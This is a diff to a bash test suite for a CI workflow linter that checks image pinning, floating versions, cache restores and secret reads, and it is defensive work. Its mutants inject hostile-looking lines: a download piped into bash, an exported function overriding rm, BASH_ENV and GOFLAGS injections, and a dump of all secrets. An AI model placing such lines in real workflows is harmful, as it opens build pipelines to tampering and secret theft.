+	'    - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' >"${WORK}/persist-repo/.github/actions/co/action.yml"
+REPO_DIR="${WORK}/persist-repo" expect_caught 'a checkout inside a local composite action (#1001)' persist "$WORKFLOWS/docker-build.yml" \
+	$'\n      - name: Set up Docker Buildx' \
+	$'\n      - uses: ./.github/actions/co\n\n      - name: Set up Docker Buildx' \
+	'docker-build (via ./.github/actions/co): checkout leaves the token in .git/config'
+
+echo
+echo "every container, service and docker:// image is pinned by digest, in any workflow (#1048)"
+for f in "$WORKFLOWS"/*.yml; do
+	expect_clean "$(basename "$f")" images "$f"
+done
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	expect_caught 'a job container by tag in a PR workflow (#1048)' images "$WORKFLOWS/docker-build.yml" \
+		$'    timeout-minutes: 30\n' $'    timeout-minutes: 30\n    container: node:22\n' \
+		'docker-build: container image is not pinned by digest ("node:22")'
+	expect_caught 'a job container image by tag, in the long form (#1048)' images "$WORKFLOWS/test.yml" \
+		$'  plist-lint:\n' $'  plist-lint:\n    container:\n      image: ubuntu:24.04\n' \
+		'plist-lint: container image is not pinned by digest ("ubuntu:24.04")'
+	expect_caught 'a service image by tag (#1048)' images "$WORKFLOWS/test.yml" \
+		$'  plist-lint:\n' $'  plist-lint:\n    services:\n      db:\n        image: postgres:16\n' \
+		'plist-lint: service db image is not pinned by digest ("postgres:16")'
+	expect_caught 'a service image by tag through env (#1048)' images "$WORKFLOWS/test.yml" \
+		$'  plist-lint:\n' $'  plist-lint:\n    env:\n      DB: postgres:16\n    services:\n      db:\n        image: ${{ env.DB }}\n' \
+		'plist-lint: service db image is not pinned by digest'
+	expect_caught 'a service image with a digest followed by more text (#1048)' images "$WORKFLOWS/test.yml" \
+		$'  plist-lint:\n' $'  plist-lint:\n    services:\n      db:\n        image: postgres@sha256:0000000000000000000000000000000000000000000000000000000000000000-x\n' \
+		'plist-lint: service db image is not pinned by digest'
+	expect_caught 'a docker:// step by tag in a workflow that holds authority (#1048)' images "$WORKFLOWS/release.yml" \
+		'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' $'      - uses: docker://alpine:3\n      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' \
+		'runs docker://alpine:3, not pinned by digest'
+}
+# A local Docker action, by tag or built from a Dockerfile (#1048 review).
+for img in 'docker://alpine:3' 'Dockerfile'; do
+	rm -rf "${WORK}/docker-repo" && mkdir -p "${WORK}/docker-repo/.github/actions/d"
+	printf '%s\n' 'name: d' 'description: docker' 'runs:' '  using: docker' "  image: ${img}" >"${WORK}/docker-repo/.github/actions/d/action.yml"
+	REPO_DIR="${WORK}/docker-repo" expect_caught "a local Docker action whose image is ${img} (#1048 review)" images "$WORKFLOWS/test.yml" \
+		'      - name: Parse every plist' $'      - uses: ./.github/actions/d\n      - name: Parse every plist' \
+		"plist-lint: runs the local Docker action ./.github/actions/d (image \"${img}\"), not pinned by digest"
+done
+# ...and a digest is accepted, so the rule is not simply refusing every image.
+copy="${WORK}/images-ok.yml"
+FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+await Bun.write(process.env.TO, s.replace("\n  plist-lint:\n", "\n  plist-lint:\n    container:\n      image: ubuntu@sha256:" + "a".repeat(64) + "\n    services:\n      db: postgres@sha256:" + "b".repeat(64) + "\n"));
+'
+if grep -q 'sha256:a' "$copy" && [ -z "$(check images "$copy")" ]; then
+	ok "an image pinned by digest is accepted (#1048)"
+else
+	no "an image pinned by digest is accepted (#1048)" "$(check images "$copy")"
+fi
+
+echo
 echo "the publish path holds nothing by default"
 expect_clean "release-exec.yml: permissions {} at the top, every job explicit" publish-perms "$WORKFLOWS/release-exec.yml"
 
@@ -1777,6 +2511,7 @@ held=0
 reached=()
 authed=()
 pinchecked=()
+mutchecked=()
 for f in "$WORKFLOWS"/*.yml; do
 	auth="$(check authority "$f")" || {
 		no "$(basename "$f"): authority check ran" "the bun helper failed"
@@ -1791,9 +2526,13 @@ for f in "$WORKFLOWS"/*.yml; do
 	[ -n "$auth" ] || [ -n "$reach" ] || continue
 	pinchecked+=("$(basename "$f")")
 	expect_clean "$(basename "$f")" pinned "$f"
+	# (#1048) mutable too, on the same set: a workflow a PR starts runs
+	# whatever a moved name fetches just as unattended. Its cache part holds
+	# a workflow with no authority to the exact-key form (#1047).
+	mutchecked+=("$(basename "$f")")
+	expect_clean "$(basename "$f"): fetches nothing by a floating version or an undigested image" mutable "$f"
 	[ -n "$auth" ] || continue
 	held=$((held + 1))
-	expect_clean "$(basename "$f"): fetches nothing by a floating version or an undigested image" mutable "$f"
 done
 # The two PR workflows that hold no authority, which only the reach
 # derivation brings under the pin (#984): read from what the loop above
@@ -1806,6 +2545,19 @@ for f in docker-build.yml test.yml; do
 		no "the pin rule is applied to ${f}, which a PAT-opened PR starts (#984)" "pin-checked: ${pinchecked[*]}"
 	fi
 done
+# (#1048) The mutable rule reaches the same two, and the same set as the pin.
+for f in docker-build.yml test.yml; do
+	if printf '%s\n' "${mutchecked[@]}" | grep -qxF "$f"; then
+		ok "the mutable rule is applied to ${f}, which a PAT-opened PR starts (#1048)"
+	else
+		no "the mutable rule is applied to ${f}, which a PAT-opened PR starts (#1048)" "mutable-checked: ${mutchecked[*]}"
+	fi
+done
+if [ "$(printf '%s\n' "${mutchecked[@]}" | LC_ALL=C sort -u)" = "$(printf '%s\n' "${pinchecked[@]}" | LC_ALL=C sort -u)" ]; then
+	ok "the mutable rule is applied to every workflow the pin rule is (#1048)"
+else
+	no "the mutable rule is applied to every workflow the pin rule is (#1048)" "pin: ${pinchecked[*]}; mutable: ${mutchecked[*]}"
+fi
 # ...and to exactly the workflows that hold authority or that a push or a
 # PR can start, no fewer.
 want="$(printf '%s\n' "${authed[@]}" "${reached[@]}" | sed '/^$/d' | LC_ALL=C sort -u | tr '\n' ' ')"
@@ -2465,10 +3217,13 @@ fi
 # only gains a secret reference; its tag (put back, as above) must surface.
 # shellcheck disable=SC2016 # JavaScript source, not shell.
 FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
+// test.yml has no top-level env since #1047, so one is added in front of
+// jobs:, and a missing anchor writes nothing, which fails the check below.
 const s = await Bun.file(process.env.FROM).text();
-await Bun.write(process.env.TO, s.replace("\nenv:\n", "\nenv:\n  SOME_KEY: ${{ secrets.SOME_KEY }}\n").replace("uses: actions/checkout@", "uses: actions/checkout@v7 #"));
-'
-if [ -n "$(check authority "$copy")" ] && [ -n "$(check pinned "$copy")" ]; then
+if (s.split("\njobs:\n").length !== 2) process.exit(2);
+await Bun.write(process.env.TO, s.replace("\njobs:\n", "\nenv:\n  SOME_KEY: ${{ secrets.SOME_KEY }}\n\njobs:\n").replace("uses: actions/checkout@", "uses: actions/checkout@v7 #"));
+' && ok_written=1 || ok_written=0
+if [ "$ok_written" = 1 ] && [ -n "$(check authority "$copy")" ] && [ -n "$(check pinned "$copy")" ]; then
 	ok "reports: a read-only workflow that reads a secret while using tags"
 else
 	no "reports: a read-only workflow that reads a secret while using tags"
@@ -2476,10 +3231,13 @@ fi
 # ...and secrets.GITHUB_TOKEN alone is not: its scope is the permissions block.
 # shellcheck disable=SC2016 # JavaScript source, not shell.
 FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
+// test.yml has no top-level env since #1047, so one is added in front of
+// jobs:, and a missing anchor writes nothing, which fails the check below.
 const s = await Bun.file(process.env.FROM).text();
-await Bun.write(process.env.TO, s.replace("\nenv:\n", "\nenv:\n  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"));
-'
-if [ -z "$(check authority "$copy")" ]; then
+if (s.split("\njobs:\n").length !== 2) process.exit(2);
+await Bun.write(process.env.TO, s.replace("\njobs:\n", "\nenv:\n  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n\njobs:\n"));
+' && ok_written=1 || ok_written=0
+if [ "$ok_written" = 1 ] && [ -z "$(check authority "$copy")" ]; then
 	ok "a read-only workflow reading only secrets.GITHUB_TOKEN holds no authority"
 else
 	no "a read-only workflow reading only secrets.GITHUB_TOKEN holds no authority"
@@ -2505,25 +3263,249 @@ await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.N
 else
 	no "the bun-setup tag mutant could be applied (action.yml no longer has the text it mutates)"
 fi
-expect_caught 'a cached Bun inside a local composite action, used where authority is held' mutable "$WORKFLOWS/release.yml" \
+# (#1048) mutable on the PR workflows, which hold no authority.
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	expect_caught 'BuildKit back to its default image in the PR image build (#1048)' mutable "$WORKFLOWS/docker-build.yml" \
+		$'        with:\n          driver-opts: image=moby/buildkit:v0.33.1@sha256:cec9f139f45e93c5c69c60f8b07cfad9f43f4ef6b6a6cd917527fea5ff2e3dea\n' '' \
+		'docker-build: step Set up Docker Buildx: BuildKit image is not pinned by digest ("default buildx-stable-1")'
+	expect_caught 'BuildKit by tag in the PR image build (#1048)' mutable "$WORKFLOWS/docker-build.yml" \
+		'image=moby/buildkit:v0.33.1@sha256:cec9f139f45e93c5c69c60f8b07cfad9f43f4ef6b6a6cd917527fea5ff2e3dea' 'image=moby/buildkit:buildx-stable-1' \
+		'BuildKit image is not pinned by digest ("moby/buildkit:buildx-stable-1")'
+	expect_caught 'a floating Go version back in the PR test workflow (#1048)' mutable "$WORKFLOWS/test.yml" \
+		$'\njobs:\n' $'\nenv:\n  GO_VERSION: "1.25"\n\njobs:\n' \
+		'env.GO_VERSION is "1.25"'
+	expect_caught 'a download piped into a shell in the PR test workflow (#1048)' mutable "$WORKFLOWS/test.yml" \
+		'      - name: Parse every plist' $'      - run: curl -fsSL https://bun.sh/install | bash\n      - name: Parse every plist' \
+		'pipes a download into a shell'
+	expect_caught 'a floating Bun in the toast job (#1048)' mutable "$WORKFLOWS/test.yml" \
+		'          bun-version: "1.4.2"' '          bun-version: latest' \
+		'toast-windows: step oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6: bun-version resolves to "latest"'
+	expect_caught 'a cache restore spelled in another case, where authority is held (#1048)' mutable "$WORKFLOWS/release.yml" \
+		'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' $'      - uses: Actions/Cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0\n        with:\n          path: x\n          key: k\n      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' \
+		'restores from the Actions cache (writable by any run on main)'
+	expect_caught 'setup-bun spelled in another case, with its cache on (#1048)' mutable "$WORKFLOWS/test.yml" \
+		'      - name: Parse every plist' $'      - uses: Oven-sh/Setup-Bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0\n      - name: Parse every plist' \
+		'plist-lint: step Oven-sh/Setup-Bun@0c5077e51419868618aeaa5fe8019c62421857d6: setup-bun without no-cache: true'
+}
+# (#1047) A cached Bun inside a local composite action, refused where
+# authority is held: since #1047 bun-setup downloads Bun and restores its
+# install cache by exact key only, which is refused there too, so this
+# mutant names the reason (it replaced an older one that named none).
+expect_caught 'an exact-key cache restore, used where authority is held (#1047)' mutable "$WORKFLOWS/release.yml" \
 	'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' '      - uses: ./.github/actions/bun-setup
-      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0'
+      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' \
+	'(via ./.github/actions/bun-setup) Cache bun install cache: restores from the Actions cache (writable by any run on main)'
+echo
+echo "a workflow that holds no authority restores its caches by exact key only (#1047)"
+# The cache part of mutable, on test.yml as it stands: nothing about a cache.
+found="$(check mutable "$WORKFLOWS/test.yml")" || found="(the bun helper failed)"
+if ! grep -qiE 'cache|restore|helper failed' <<<"$found"; then
+	ok "test.yml restores no cache but by its exact key, through bun-setup and go-setup (#1047)"
+else
+	no "test.yml restores no cache but by its exact key, through bun-setup and go-setup (#1047)" "$found"
+fi
+# A reusable workflow runs with its caller token, so its caches are refused
+# as where authority is held (#1047 review).
+expect_caught 'an exact-key cache in a workflow another can call (#1047 review)' mutable "$WORKFLOWS/test.yml" \
+	$'  pull_request:\n' $'  pull_request:\n  workflow_call:\n' \
+	'(via ./.github/actions/bun-setup) Cache bun install cache: restores from the Actions cache (writable by any run on main)'
+# action_case <label> <action> <exact text> <replacement> <reason>: the
+# mutable rule on test.yml with one local composite action mutated, in a
+# copy of .github/actions; the report must contain the reason.
+action_case() {
+	local repo="${WORK}/action-repo"
+	# sidecar/go.mod too: go-setup reads go-version-file from the repository.
+	rm -rf "$repo" && mkdir -p "${repo}/.github" "${repo}/sidecar" && cp -R "${HERE}/../actions" "${repo}/.github/actions" &&
+		cp "${HERE}/../../sidecar/go.mod" "${repo}/sidecar/go.mod"
+	if ! FROM="${repo}/.github/actions/$2/action.yml" OLD="$3" NEW="$4" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+if (s.split(process.env.OLD).length !== 2) process.exit(2);
+await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
+'; then
+		no "mutant '$1' could be applied (the action no longer has the text it mutates, once)"
+		return
+	fi
+	local found
+	found="$(REPO_DIR="$repo" check mutable "$WORKFLOWS/test.yml")" || {
+		no "reports: $1" "the check could not read the mutated action: ${found}"
+		return
+	}
+	if grep -qF -- "$5" <<<"$found"; then ok "reports: $1"; else no "reports: $1, for the reason it exists" "wanted '${5}', got:
+${found:-nothing}"; fi
+}
+# The copy action_case reads, unmutated, is clean: so each case below is
+# reported for its mutation, not for the copy.
+rm -rf "${WORK}/action-repo" && mkdir -p "${WORK}/action-repo/.github" "${WORK}/action-repo/sidecar" &&
+	cp -R "${HERE}/../actions" "${WORK}/action-repo/.github/actions" && cp "${HERE}/../../sidecar/go.mod" "${WORK}/action-repo/sidecar/go.mod"
+if found="$(REPO_DIR="${WORK}/action-repo" check mutable "$WORKFLOWS/test.yml")" && [ -z "$found" ]; then
+	ok "the action copy the cases below mutate is clean as it stands (#1047)"
+else
+	no "the action copy the cases below mutate is clean as it stands (#1047)" "$found"
+fi
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	action_case 'the bun install cache restored by a key prefix again (#1047)' bun-setup \
+		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n' \
+		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n        restore-keys: ${{ runner.os }}-bun-\n' \
+		'Cache bun install cache: restores by a key prefix (restore-keys)'
+	action_case 'the bun install cache kept on a match that is not exact (#1047)' bun-setup \
+		$'\n    - name: Discard a bun install cache that is not an exact key match\n      if: steps.bun-install-cache.outputs.cache-hit != \'true\'\n      shell: bash\n      run: rm -rf ~/.bun/install/cache\n' '' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'the bun install cache discarded only on an exact hit (#1047)' bun-setup \
+		$'      if: steps.bun-install-cache.outputs.cache-hit != \'true\'' $'      if: steps.bun-install-cache.outputs.cache-hit == \'true\'' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'the bun install cache discard pointed at another directory (#1047)' bun-setup \
+		'      run: rm -rf ~/.bun/install/cache' '      run: rm -rf ~/.bun/install/tmp' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'the bun install cache step with no id to test (#1047)' bun-setup \
+		$'      id: bun-install-cache\n' '' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'a step between the bun install cache and its discard (#1047)' bun-setup \
+		$'\n    - name: Discard a bun install cache' $'\n    - run: ls ~/.bun/install/cache\n      shell: bash\n\n    - name: Discard a bun install cache' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'Bun itself restored from the Actions cache in a PR workflow (#1047)' bun-setup \
+		$'        no-cache: true\n' '' \
+		'setup-bun without no-cache: true restores Bun from the Actions cache'
+	action_case 'the Go module cache left out of the discard (#1047)' go-setup \
+		$'        GOMODCACHE: ${{ steps.go-cache-dirs.outputs.mod }}\n' '' \
+		'Go module and build cache: a restore that is not an exact key match is not discarded'
+	action_case 'the Go caches restored by a key prefix (#1047)' go-setup \
+		$'        lookup-only: ${{ steps.go-cache-lookup.outputs.cache-hit != \'true\' }}\n' $'        lookup-only: ${{ steps.go-cache-lookup.outputs.cache-hit != \'true\' }}\n        restore-keys: go-\n' \
+		'Go module and build cache: restores by a key prefix (restore-keys)'
+	action_case 'setup-go back to its own prefix-matched cache in a PR workflow (#1047)' go-setup \
+		$'        cache: false\n' '' \
+		'setup-go without cache: false restores modules and build output from the Actions cache'
+	action_case 'the bun install cache with no exact-key lookup in front (#1047 review)' bun-setup \
+		$'        lookup-only: true\n' $'        lookup-only: false\n' \
+		'Cache bun install cache: not gated by a lookup-only actions/cache/restore'
+	action_case 'the bun install cache downloading whatever it matches (#1047 review)' bun-setup \
+		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n' '' \
+		'Cache bun install cache: not gated by a lookup-only actions/cache/restore'
+	action_case 'the bun install cache looked up on another key (#1047 review)' bun-setup \
+		$'        key: ${{ runner.os }}-bun-${{ hashFiles(\'bun.lock\') }}\n        lookup-only: true\n' $'        key: ${{ runner.os }}-bun-other\n        lookup-only: true\n' \
+		'Cache bun install cache: not gated by a lookup-only actions/cache/restore'
+	action_case 'the bun install cache discard that removes nothing (#1047 review)' bun-setup \
+		'      run: rm -rf ~/.bun/install/cache' '      run: ls ~/.bun/install/cache' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'the bun install cache discard aimed at a longer name (#1047 review)' bun-setup \
+		'      run: rm -rf ~/.bun/install/cache' '      run: rm -rf ~/.bun/install/cache-old' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'the bun install cache discard allowed to fail (#1047 review)' bun-setup \
+		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: bash\n      continue-on-error: true\n      run: rm -rf ~/.bun/install/cache' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'the Go build cache left out of the discard (#1047 review)' go-setup \
+		$'        rm -rf "$GOCACHE"\n' '' \
+		'Go module and build cache: a restore that is not an exact key match is not discarded'
+	action_case 'the Go module cache env renamed, so go clean ignores it (#1047 review)' go-setup \
+		$'        GOMODCACHE: ${{ steps.go-cache-dirs.outputs.mod }}\n' $'        MODDIR: ${{ steps.go-cache-dirs.outputs.mod }}\n' \
+		'Go module and build cache: a restore that is not an exact key match is not discarded'
+	action_case 'a lone actions/cache/restore that downloads (#1047 review)' go-setup \
+		$'        lookup-only: true\n' '' \
+		'Look up the Go caches by their exact key: actions/cache/restore here is not a lookup-only step'
+	action_case 'GOFLAGS on the Go discard, which turns go clean into a dry run (#1047 review 2)' go-setup \
+		$'        GOCACHE: ${{ steps.go-cache-dirs.outputs.build }}\n' $'        GOCACHE: ${{ steps.go-cache-dirs.outputs.build }}\n        GOFLAGS: -n\n' \
+		'Go module and build cache: a restore that is not an exact key match is not discarded'
+	action_case 'BASH_ENV on the bun install cache discard (#1047 review 2)' bun-setup \
+		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: bash\n      env:\n        BASH_ENV: /tmp/x\n      run: rm -rf ~/.bun/install/cache' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'a quoted ~ in the discard env, which bash does not expand (#1047 review 2)' bun-setup \
+		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: bash\n      env:\n        D: ~/.bun/install/cache\n      run: rm -rf "$D"' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'restore-keys spelled in another case (#1047 review 2)' bun-setup \
+		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n' $'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n        Restore-Keys: ${{ runner.os }}-bun-\n' \
+		'Cache bun install cache: restores by a key prefix (restore-keys)'
+	action_case 'lookup-only spelled twice, once as false (#1047 review 2)' bun-setup \
+		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n' $'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n        Lookup-Only: false\n' \
+		'Cache bun install cache: takes inputs other than path, key and lookup-only, or one spelled twice'
+	action_case 'another input on the cache step (#1047 review 2)' bun-setup \
+		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n' $'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n        enableCrossOsArchive: true\n' \
+		'Cache bun install cache: takes inputs other than path, key and lookup-only'
+	action_case 'the bun install cache discard under sh (#1047 review 2)' bun-setup \
+		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: sh\n      run: rm -rf ~/.bun/install/cache' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'the Go caches looked up on another path (#1047 review 2)' go-setup \
+		$'          ${{ steps.go-cache-dirs.outputs.build }}\n        key: go-${{ runner.os }}-${{ runner.arch }}-${{ steps.go-cache-dirs.outputs.image }}-${{ steps.go-cache-dirs.outputs.version }}-${{ hashFiles(\'sidecar/go.sum\') }}\n        lookup-only: true\n' \
+		$'          /tmp/other\n        key: go-${{ runner.os }}-${{ runner.arch }}-${{ steps.go-cache-dirs.outputs.image }}-${{ steps.go-cache-dirs.outputs.version }}-${{ hashFiles(\'sidecar/go.sum\') }}\n        lookup-only: true\n' \
+		'Go module and build cache: not gated by a lookup-only actions/cache/restore'
+	action_case 'GOCACHE gone from the discard env while rm still names it (#1047 review 2)' go-setup \
+		$'        GOCACHE: ${{ steps.go-cache-dirs.outputs.build }}\n' '' \
+		'Go module and build cache: a restore that is not an exact key match is not discarded'
+	expect_caught 'HOME set for the whole job, which moves the discard (#1047 review 2)' mutable "$WORKFLOWS/test.yml" \
+		$'\n  test:\n' $'\n  test:\n    env:\n      HOME: /nonexistent\n' \
+		'test: step (via ./.github/actions/bun-setup) Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'GOFLAGS on the Go discard, read by an extra rm line (#1047 review 3)' go-setup \
+		$'        GOCACHE: ${{ steps.go-cache-dirs.outputs.build }}\n      run: |\n' $'        GOCACHE: ${{ steps.go-cache-dirs.outputs.build }}\n        GOFLAGS: -n\n      run: |\n        rm -rf -- "$GOFLAGS"\n' \
+		'Go module and build cache: a restore that is not an exact key match is not discarded'
+	action_case 'BASH_ENV on the bun discard, read by an extra rm line (#1047 review 3)' bun-setup \
+		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: bash\n      env:\n        BASH_ENV: ./x.sh\n      run: |\n        rm -rf "$BASH_ENV"\n        rm -rf ~/.bun/install/cache' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	action_case 'HOME on the bun discard, read by an extra rm line (#1047 review 3)' bun-setup \
+		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: bash\n      env:\n        HOME: /nonexistent\n      run: |\n        rm -rf "$HOME"\n        rm -rf ~/.bun/install/cache' \
+		'Cache bun install cache: a restore that is not an exact key match is not discarded'
+	expect_caught 'GOFLAGS on the step that uses go-setup (#1047 review 3)' mutable "$WORKFLOWS/test.yml" \
+		$'      - uses: ./.github/actions/go-setup\n' $'      - uses: ./.github/actions/go-setup\n        env:\n          GOFLAGS: -n\n' \
+		'the job, workflow or enclosing step sets GOFLAGS'
+	expect_caught 'HOME on the step that uses bun-setup (#1047 review 3)' mutable "$WORKFLOWS/test.yml" \
+		$'      - uses: ./.github/actions/bun-setup\n' $'      - uses: ./.github/actions/bun-setup\n        env:\n          HOME: /nonexistent\n' \
+		'the job, workflow or enclosing step sets HOME'
+	expect_caught 'an exported bash function for the whole job (#1047 review 3)' mutable "$WORKFLOWS/test.yml" \
+		$'\n  test:\n' $'\n  test:\n    env:\n      BASH_FUNC_rm%%: "() { :; }"\n' \
+		'the job, workflow or enclosing step sets BASH_FUNC_rm%%'
+	expect_caught 'XDG_CONFIG_HOME for the whole workflow, where go reads its env file (#1047 review 3)' mutable "$WORKFLOWS/test.yml" \
+		$'\njobs:\n' $'\nenv:\n  XDG_CONFIG_HOME: /tmp/x\n\njobs:\n' \
+		'the job, workflow or enclosing step sets XDG_CONFIG_HOME'
+	expect_caught 'GOFLAGS written to GITHUB_ENV before go-setup (#1047 review 4)' mutable "$WORKFLOWS/test.yml" \
+		$'      - uses: ./.github/actions/go-setup\n' $'      - run: echo "GOFLAGS=-n" >> "$GITHUB_ENV"\n      - uses: ./.github/actions/go-setup\n' \
+		'GOFLAGS (written to GITHUB_ENV by an earlier step)'
+	expect_caught 'a directory put on PATH before bun-setup (#1047 review 4)' mutable "$WORKFLOWS/test.yml" \
+		$'      - uses: ./.github/actions/bun-setup\n' $'      - run: echo "$PWD/tools" >> "$GITHUB_PATH"\n      - uses: ./.github/actions/bun-setup\n' \
+		'GITHUB_PATH (written by an earlier step)'
+	expect_caught 'GITHUB_ENV written from a file before bun-setup (#1047 review 4)' mutable "$WORKFLOWS/test.yml" \
+		$'      - uses: ./.github/actions/bun-setup\n' $'      - run: cat env.txt >> "$GITHUB_ENV"\n      - uses: ./.github/actions/bun-setup\n' \
+		'GITHUB_ENV written in a form this rule cannot read'
+	expect_caught 'the job env as one expression (#1047 review 4)' mutable "$WORKFLOWS/test.yml" \
+		$'\n  test:\n' $'\n  test:\n    env: ${{ fromJSON(vars.TEST_ENV) }}\n' \
+		'an env this rule cannot read as a mapping'
+	expect_caught 'two GITHUB_ENV writes on one line, one of them a steering name (#1047 review 4)' mutable "$WORKFLOWS/test.yml" \
+		$'      - uses: ./.github/actions/bun-setup\n' $'      - run: echo "GOFLAGS=-n" >> "$GITHUB_ENV" && echo "FOO=1" >> "$GITHUB_ENV"\n      - uses: ./.github/actions/bun-setup\n' \
+		'GOFLAGS (written to GITHUB_ENV by an earlier step)'
+	# On Windows Go places its caches under these, as HOME on the others.
+	expect_caught 'USERPROFILE for the Windows Go job, which moves the module cache (#1047 review 5)' mutable "$WORKFLOWS/test.yml" \
+		$'  sidecar-test-windows:\n' $'  sidecar-test-windows:\n    env:\n      USERPROFILE: /tmp/elsewhere\n' \
+		'the job, workflow or enclosing step sets USERPROFILE'
+	expect_caught 'LOCALAPPDATA on the step that uses go-setup (#1047 review 5)' mutable "$WORKFLOWS/test.yml" \
+		$'      - uses: ./.github/actions/go-setup\n' $'      - uses: ./.github/actions/go-setup\n        env:\n          LOCALAPPDATA: /tmp/x\n' \
+		'the job, workflow or enclosing step sets LOCALAPPDATA'
+	expect_caught 'APPDATA for the whole workflow (#1047 review 5)' mutable "$WORKFLOWS/test.yml" \
+		$'\njobs:\n' $'\nenv:\n  APPDATA: /tmp/x\n\njobs:\n' \
+		'the job, workflow or enclosing step sets APPDATA'
+	expect_caught 'Bun restored from the Actions cache by the toast job (#1047)' mutable "$WORKFLOWS/test.yml" \
+		$'          no-cache: true\n' '' \
+		'toast-windows: step oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6: setup-bun without no-cache: true'
+}
 # shellcheck disable=SC2016 # JavaScript source, not shell.
 FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
+// test.yml has no top-level env since #1047, so one is added in front of
+// jobs:, and a missing anchor writes nothing, which fails the check below.
 const s = await Bun.file(process.env.FROM).text();
-await Bun.write(process.env.TO, s.replace("\nenv:\n", "\nenv:\n  ALL: ${{ toJSON(secrets) }}\n"));
-'
-if [ -n "$(check authority "$copy")" ]; then
+if (s.split("\njobs:\n").length !== 2) process.exit(2);
+await Bun.write(process.env.TO, s.replace("\njobs:\n", "\nenv:\n  ALL: ${{ toJSON(secrets) }}\n\njobs:\n"));
+' && ok_written=1 || ok_written=0
+if [ "$ok_written" = 1 ] && [ -n "$(check authority "$copy")" ]; then
 	ok "reports: a workflow that serialises the whole secrets context holds authority"
 else
 	no "reports: a workflow that serialises the whole secrets context holds authority"
 fi
 # shellcheck disable=SC2016 # JavaScript source, not shell.
 FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
+// test.yml has no top-level env since #1047, so one is added in front of
+// jobs:, and a missing anchor writes nothing, which fails the check below.
 const s = await Bun.file(process.env.FROM).text();
-await Bun.write(process.env.TO, s.replace("\nenv:\n", "\nenv:\n  K: ${{ format(\x27{0}\x27, SECRETS.SOME_KEY) }}\n"));
-'
-if [ -n "$(check authority "$copy")" ]; then
+if (s.split("\njobs:\n").length !== 2) process.exit(2);
+await Bun.write(process.env.TO, s.replace("\njobs:\n", "\nenv:\n  K: ${{ format(\x27{0}\x27, SECRETS.SOME_KEY) }}\n\njobs:\n"));
+' && ok_written=1 || ok_written=0
+if [ "$ok_written" = 1 ] && [ -n "$(check authority "$copy")" ]; then
 	ok "reports: a secret read inside a format string, in upper case"
 else
 	no "reports: a secret read inside a format string, in upper case"
@@ -2588,8 +3570,128 @@ expect_caught 'a short SHA on the publish path' pinned "$WORKFLOWS/sidecar-relea
 	fi
 	expect_caught 'Bun restored from the Actions cache' mutable "$WORKFLOWS/release.yml" \
 		$'          no-cache: true\n' ''
+	expect_caught 'the npm cache of setup-node left on in the job holding id-token (#1046 review)' mutable "$WORKFLOWS/sidecar-release.yml" \
+		$'          package-manager-cache: false\n' '' \
+		'setup-node without package-manager-cache: false'
